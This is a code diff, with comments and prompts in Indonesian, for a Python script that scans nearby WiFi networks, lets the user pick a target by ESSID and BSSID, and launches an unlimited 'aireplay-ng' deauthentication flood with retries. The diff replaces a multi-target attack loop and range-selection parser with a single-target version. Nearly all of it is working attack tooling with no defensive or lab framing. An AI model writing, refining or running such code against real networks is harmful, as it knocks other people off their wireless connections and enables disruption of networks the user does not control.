@@ -226,121 +226,21 @@ def set_monitor_channel(monitor_iface, channel):
     run_command(["sudo", "iw", "dev", monitor_iface, "set", "channel", str(channel)], None, show_output=False)
 
 
-def run_deauth_attack(targets, monitor_iface, retries=3, retry_delay=3):
-    """Menjalankan serangan deauth untuk multiple target secara bergantian"""
-    for idx, target in enumerate(targets, 1):
-        print(f"\n{CYAN}{BOLD}[{idx}/{len(targets)}]{RESET} Menyerang target: {target['essid']} ({target['bssid']})")
-        
-        for attempt in range(1, retries + 1):
-            set_monitor_channel(monitor_iface, target.get("channel"))
-            cmd = ["sudo", "aireplay-ng", "-0", "0", "-a", target["bssid"], monitor_iface]
-            print(f"{YELLOW}{' '.join(cmd)}{RESET}")
+def run_deauth_attack(target, monitor_iface, retries=3, retry_delay=3):
+    for attempt in range(1, retries + 1):
+        set_monitor_channel(monitor_iface, target.get("channel"))
+        cmd = ["sudo", "aireplay-ng", "-0", "0", "-a", target["bssid"], monitor_iface]
+        print(f"\n{CYAN}▶ Menjalankan serangan deauth{RESET}")
+        print(f"{YELLOW}{' '.join(cmd)}{RESET}")
 
-            result = run_command(cmd, None, show_output=False)
-            if result is not None:
-                print(f"{GREEN}✓ Serangan deauth berhasil diluncurkan untuk {target['essid']}{RESET}")
-                break
+        result = run_command(cmd, None, show_output=False)
+        if result is not None:
+            return
 
-            if attempt < retries:
-                print(f"{YELLOW}Percobaan {attempt} gagal, mencoba lagi dalam {retry_delay} detik...{RESET}")
-                time.sleep(retry_delay)
-        
-        if attempt == retries and result is None:
-            print(f"{RED}✗ Serangan deauth gagal setelah {retries} percobaan untuk {target['essid']}{RESET}")
-        
-        # Jeda antar target
-        if idx < len(targets):
-            print(f"{CYAN}Menunggu 3 detik sebelum menyerang target berikutnya...{RESET}")
-            time.sleep(3)
+        if attempt < retries:
+            time.sleep(retry_delay)
 
-
-def parse_target_selection(choice_str, total_targets):
-    """
-    Parsing input selection untuk multiple target
-    Mendukung format:
-    - "2" -> target nomor 2
-    - "2 3 5" -> target 2, 3, dan 5
-    - "2-5" -> target 2, 3, 4, 5
-    - "1,3,5-7" -> kombinasi semua format
-    """
-    if not choice_str.strip():
-        return []
-    
-    selected = set()
-    parts = re.split(r'[,\s]+', choice_str.strip())
-    
-    for part in parts:
-        if not part:
-            continue
-            
-        if '-' in part:
-            # Range selection (e.g., "2-5")
-            try:
-                start, end = part.split('-')
-                start_num = int(start.strip())
-                end_num = int(end.strip())
-                if start_num > end_num:
-                    start_num, end_num = end_num, start_num
-                for num in range(start_num, end_num + 1):
-                    if 1 <= num <= total_targets:
-                        selected.add(num)
-            except ValueError:
-                continue
-        else:
-            # Single selection
-            try:
-                num = int(part.strip())
-                if 1 <= num <= total_targets:
-                    selected.add(num)
-            except ValueError:
-                continue
-    
-    return sorted(selected)
-
-
-def select_targets(networks):
-    """Memilih multiple target WiFi dengan berbagai format input"""
-    if not networks:
-        print("Ga ada jaringan yang ketemu.")
-        return None
-
-    print(f"\n{BOLD}Pilih target WiFi (bisa pilih banyak):{RESET}")
-    print(f"{YELLOW}Format: 1 3 5  atau  2-5  atau  1,3,5-7  atau  kombinasi{RESET}")
-    print()
-    
-    header = f"{'No':<3} {'ESSID':<20} {'CH':<3} {'BSSID'}"
-    print(header)
-    print("-" * len(header))
-    for idx, net in enumerate(networks, start=1):
-        essid = net["essid"][:20]
-        print(f"{GREEN}{idx:<3}{RESET} {essid:<20} {net['channel']:<3} {net['bssid']}")
-
-    while True:
-        choice = input("\nNomor target (pisahkan dengan spasi/koma, contoh: 2 3 5): ").strip()
-        
-        if not choice:
-            print("Input tidak boleh kosong, coba lagi.")
-            continue
-        
-        selected_indices = parse_target_selection(choice, len(networks))
-        
-        if not selected_indices:
-            print("Input salah atau tidak ada target valid, coba lagi.")
-            continue
-        
-        selected_targets = [networks[idx - 1] for idx in selected_indices]
-        
-        print(f"\n{GREEN}✓ Terpilih {len(selected_targets)} target:{RESET}")
-        for target in selected_targets:
-            print(f"  - {target['essid']} | CH {target['channel']} | BSSID {target['bssid']}")
-        
-        confirm = input(f"\n{YELLOW}Lanjutkan serangan ke semua target? (y/n): {RESET}").strip().lower()
-        if confirm in ['y', 'yes', '']:
-            glitch_print(f"TARGET LOCKED: {len(selected_targets)} targets selected")
-            return selected_targets
-        else:
-            print("Mengulang pemilihan target...\n")
-            continue
+    print(f"{RED}Serangan deauth gagal setelah {retries} percobaan.{RESET}")
 
 
 def prompt_keyboard_interrupt_action():
@@ -388,6 +288,28 @@ def select_interface():
         print("Input salah, coba lagi.")
 
 
+def select_target(networks):
+    if not networks:
+        print("Ga ada jaringan yang ketemu.")
+        return None
+
+    print(f"\n{BOLD}Pilih target WiFi:{RESET}")
+    header = f"{'No':<3} {'ESSID':<20} {'CH':<3} {'BSSID'}"
+    print(header)
+    print("-" * len(header))
+    for idx, net in enumerate(networks, start=1):
+        essid = net["essid"][:20]
+        print(f"{GREEN}{idx:<3}{RESET} {essid:<20} {net['channel']:<3} {net['bssid']}")
+
+    while True:
+        choice = input("\nNomor target: ").strip()
+        if choice.isdigit() and 1 <= int(choice) <= len(networks):
+            selected = networks[int(choice) - 1]
+            glitch_print(f"TARGET LOCKED: {selected['essid']}")
+            return selected
+        print("Input salah, coba lagi.")
+
+
 def main():
     adapter = None
     monitor_iface = None
@@ -408,18 +330,15 @@ def main():
                 scan_duration = 10
 
             networks = scan_networks(monitor_iface, duration=scan_duration)
-            targets = select_targets(networks)
+            target = select_target(networks)
 
-            if targets is None or not targets:
+            if target is None:
                 print("\nTidak ada target terpilih, kembali ke awal.")
                 continue
 
-            print(f"\n{CYAN}{BOLD}▶ Memulai serangan deauth ke {len(targets)} target...{RESET}")
-            
-            # Jalankan serangan untuk semua target
-            run_deauth_attack(targets, monitor_iface)
-            
-            # Setelah serangan selesai, stop monitor mode
+            print(f"\n{CYAN}Target terpilih:{RESET} {target['essid']} | CH {target['channel']} | BSSID {target['bssid']}")
+
+            run_deauth_attack(target, monitor_iface)
             stop_monitor_mode(monitor_iface)
             break
 
